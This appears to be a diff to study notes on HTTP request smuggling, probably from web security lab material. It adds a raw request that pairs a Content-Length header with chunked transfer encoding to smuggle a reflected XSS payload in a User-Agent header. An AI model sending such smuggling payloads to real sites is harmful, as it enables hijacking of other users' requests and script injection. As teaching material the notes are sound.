@@ -330,6 +330,21 @@ Cookie: session=jJNLJs2RKpbg9EQ7iWrcfzwaTvMw81Rj
 ```
 As the start of the victim's request is contained in the comment parameter, this will be posted as a comment on the blog, enabling you to read it simply by visiting the relevant post. 
 
+## Using HTTP request smuggling to exploit reflected XSS 
+
+```
+POST / HTTP/1.1
+Host: vulnerable-website.com
+Content-Length: 63
+Transfer-Encoding: chunked
+
+0
+
+GET / HTTP/1.1
+User-Agent: <script>alert(1)</script>
+Foo: X
+```
+
 # LAB
 
 
@@ -632,3 +647,5 @@ Connection: close
 
 x=1
 ```
+
+
